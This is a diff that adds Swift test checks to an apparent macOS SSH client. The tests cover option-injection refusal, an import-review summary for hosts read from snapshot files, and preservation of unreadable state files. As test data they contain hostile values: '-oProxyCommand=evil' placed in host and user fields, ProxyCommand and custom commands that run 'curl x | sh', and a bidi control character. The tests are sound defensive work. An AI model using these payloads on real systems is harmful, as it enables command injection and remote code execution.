@@ -8495,5 +8495,122 @@ do {
     check(landedWell, "any drop leaves a valid layout of the same panels, never on the dragged one, with its picture inside the region (\(landingFailure))")
 }
 
+// MARK: A destination that ssh would read as an option
+
+do {
+    let plain = SSHConnection(name: "n", host: "build.example.com", username: "deploy")
+    check(plain.destinationProblem == nil && plain.connectionRefusal == nil, "an ordinary host and user go on a command line")
+    check(SSHConnection(name: "n", host: "h", username: "").destinationProblem == nil, "no user name is fine")
+    check(SSHConnection(name: "n", host: "my-host-1", username: "a-b").destinationProblem == nil, "a dash inside a name is fine")
+    check(SSHConnection(name: "n", host: "10.0.0.5", username: "u").destinationProblem == nil, "an address is fine")
+
+    for (host, user) in [("-oProxyCommand=evil", ""), ("-J", "u"), ("h", "-oProxyCommand=evil"), ("h", "-l"), ("-x", "-y")] {
+        for transport in SSHTransport.allCases {
+            let connection = SSHConnection(name: "n", host: host, username: user, transport: transport)
+            check(connection.destinationProblem != nil, "refused, \(transport.rawValue): \(user.debugDescription) at \(host.debugDescription)")
+            check(connection.connectionRefusal?.hasPrefix("Not connecting:") == true, "…and what is said is that it is not connecting")
+        }
+    }
+    check(SSHConnection(name: "n", host: "-x", username: "u").destinationProblem?.contains("host") == true, "a host is said to be the host")
+    check(SSHConnection(name: "n", host: "h", username: "-x").destinationProblem?.contains("user name") == true,
+          "a user name is said to be the user name")
+
+    // Its own address first, then the jump hosts.
+    let both = SSHConnection(name: "n", host: "-x", username: "", jumpHosts: "bad host")
+    check(both.connectionRefusal == both.destinationProblem.map(SSHConnection.destinationRefusal),
+          "a bad address is what is said, before the jump hosts")
+    let jumps = SSHConnection(name: "n", host: "h", username: "u", jumpHosts: "bad host")
+    check(jumps.connectionRefusal == jumps.jumpHostsProblem.map(JumpHosts.refusal), "a good address with bad jump hosts is refused for those")
+
+    // host.exec is held to it too.
+    var scripted = SSHConnection(name: "n", host: "h", username: "-oProxyCommand=evil", allowScriptedCommands: true)
+    check(ScriptedCommand.refusal(for: scripted)?.hasPrefix("Not connecting:") == true,
+          "a scripted command is refused for a user name ssh would read as an option")
+    scripted.username = "u"
+    check(ScriptedCommand.refusal(for: scripted) == nil, "…and allowed once it is fixed")
+}
+
+// MARK: A host from an imported snapshot
+
+do {
+    // Asking first is saved with the host, and a host saved before it existed does not ask.
+    let old = #"{"id":"6F9619FF-8B86-D011-B42D-00C04FC964FF","name":"n","host":"h"}"#
+    check((try? JSONDecoder().decode(SSHConnection.self, from: Data(old.utf8)))?.confirmBeforeConnecting == false,
+          "a host saved before this does not ask")
+    let flagged = SSHConnection(name: "n", host: "h", username: "u", confirmBeforeConnecting: true)
+    let back = (try? JSONEncoder().encode(flagged)).flatMap { try? JSONDecoder().decode(SSHConnection.self, from: $0) }
+    check(back?.confirmBeforeConnecting == true && back == flagged, "a host that is to ask still asks after being saved and read back")
+    check(!SSHConnection(name: "n", host: "h", username: "u").confirmBeforeConnecting, "a host made here does not ask")
+
+    // What it says.
+    let plain = SSHConnection(name: "web", host: "web.example.com", username: "deploy").importReview
+    check(plain.contains("imported snapshot") && plain.contains("• ssh to deploy@web.example.com"), "it says where ssh goes")
+    check(!plain.contains("extra arguments") && !plain.contains("agent") && !plain.contains("through"),
+          "an ordinary host has nothing more to say")
+    check(SSHConnection(name: "n", host: "h", port: 2222, username: "u").importReview.contains("• ssh to u@h, port 2222"),
+          "a port that is not 22 is named")
+
+    let proxy = SSHConnection(name: "n", host: "h", username: "u", extraArguments: "  -o ProxyCommand=sh -c 'curl x | sh'  ").importReview
+    check(proxy.contains("which can run a program on this Mac: -o ProxyCommand=sh -c 'curl x | sh'"), "extra arguments are shown as written")
+
+    let custom = SSHConnection(name: "n", host: "h", username: "u", transport: .custom, extraArguments: "-v",
+                               customCommand: "/bin/sh -c 'curl x | sh'").importReview
+    check(custom.contains("• this command, on this Mac: /bin/sh -c 'curl x | sh'"), "a custom command is shown")
+    check(!custom.contains("ssh to") && !custom.contains("extra arguments"), "…instead of ssh and the arguments it does not take")
+
+    let mosh = SSHConnection(name: "n", host: "h", username: "u", transport: .mosh, extraArguments: "--client=/tmp/x",
+                             agentForwarding: .always).importReview
+    check(mosh.contains("• mosh to u@h") && mosh.contains("--client=/tmp/x"), "mosh, with its arguments")
+    check(!mosh.contains("agent"), "mosh forwards no agent, so none is mentioned")
+
+    check(SSHConnection(name: "n", host: "h", username: "u", agentForwarding: .always).importReview.contains("forwarding your SSH agent"),
+          "always forwarding the agent is said")
+    check(!SSHConnection(name: "n", host: "h", username: "u", agentForwarding: .ask).importReview.contains("forwarding your SSH agent"),
+          "asking about it is not: that question is put on its own")
+    check(SSHConnection(name: "n", host: "h", username: "u", jumpHosts: "bastion, alice@hop:2222").importReview
+            .contains("• through bastion, alice@hop:2222"), "the jump hosts are named")
+
+    // Everything in it came from the file.
+    let hostile = SSHConnection(name: "n", host: "h", username: "u",
+                                extraArguments: "-o\u{202E}x\ny" + String(repeating: "z", count: 500)).importReview
+    check(!hostile.contains("\u{202E}") && !hostile.contains("x\ny") && hostile.contains("x·y"),
+          "control and invisible characters are shown as a dot")
+    check(hostile.count < 700 && hostile.contains("…"), "a long value is cut in the middle (\(hostile.count) characters)")
+}
+
+// MARK: A saved layout this build cannot read
+
+do {
+    let fm = FileManager.default
+    let folder = URL(fileURLWithPath: NSTemporaryDirectory() + "unreadable-state-check-\(UUID().uuidString)")
+    try? fm.createDirectory(at: folder, withIntermediateDirectories: true)
+    defer { try? fm.removeItem(at: folder) }
+    let state = folder.appendingPathComponent("state.json")
+
+    check(!UnreadableState.isKept(in: folder), "an empty folder keeps nothing")
+    check(UnreadableState.keep(state) == nil, "with no file there is nothing to keep")
+
+    let moment = Date(timeIntervalSince1970: 1_800_000_000)
+    let name = UnreadableState.name(at: moment)
+    check(name.hasPrefix(UnreadableState.prefix) && name.hasSuffix(".json")
+            && name.count == UnreadableState.prefix.count + "yyyyMMdd-HHmmss".count + ".json".count,
+          "the name says when it was kept (\(name))")
+    check(UnreadableState.name(at: moment, attempt: 2) == String(name.dropLast(5)) + "-2.json", "a later one in the same second is numbered")
+
+    let written = Data(#"{"workspaces":[{"id":"x","tabs":[{"root":{"cheatsheet":{}}}]}]}"#.utf8)
+    try? written.write(to: state)
+    let first = UnreadableState.keep(state, at: moment)
+    check(first?.lastPathComponent == name && first?.deletingLastPathComponent().path == folder.path,
+          "it is kept under that name, beside where it was")
+    check(!fm.fileExists(atPath: state.path), "nothing is left where the next save writes")
+    check(first.flatMap { try? Data(contentsOf: $0) } == written, "it is kept as it was, byte for byte")
+    check(UnreadableState.isKept(in: folder), "and the folder says one is kept")
+
+    try? written.write(to: state)
+    let second = UnreadableState.keep(state, at: moment)
+    check(second != nil && second?.lastPathComponent != name, "a second one in the same second does not replace the first")
+    check(first.map { fm.fileExists(atPath: $0.path) } == true, "the first is still there")
+}
+
 print("\(checks - failures)/\(checks) checks passed")
 exit(failures == 0 ? 0 : 1)
